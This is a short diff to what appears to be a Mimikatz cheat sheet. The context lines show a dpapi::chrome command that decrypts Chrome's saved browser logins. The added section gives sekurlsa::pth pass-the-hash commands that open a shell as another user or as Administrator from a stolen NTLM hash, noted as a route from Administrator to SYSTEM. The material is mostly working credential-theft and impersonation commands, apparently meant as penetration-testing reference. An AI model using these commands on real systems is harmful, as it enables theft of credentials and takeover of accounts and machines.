@@ -245,3 +245,15 @@ Decrypt data protected by Windows DPAPI, such as browser credentials:
 ```bash
 dpapi::chrome /in:"C:\Users\<USER>\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
 ```
+
+## Launch Terminal of Other User
+
+This works through RDP only... a great way to transition from Administrator to `SYSTEM` after running `token::elevate`
+
+```bash
+sekurlsa::pth /run:cmd.exe /domain:<DOMAIN> /user:<USER> /ntlm:<HASH>
+```
+
+```bash
+sekurlsa::pth /run:cmd.exe /domain:. /user:Administrator /ntlm:<HASH>
+```
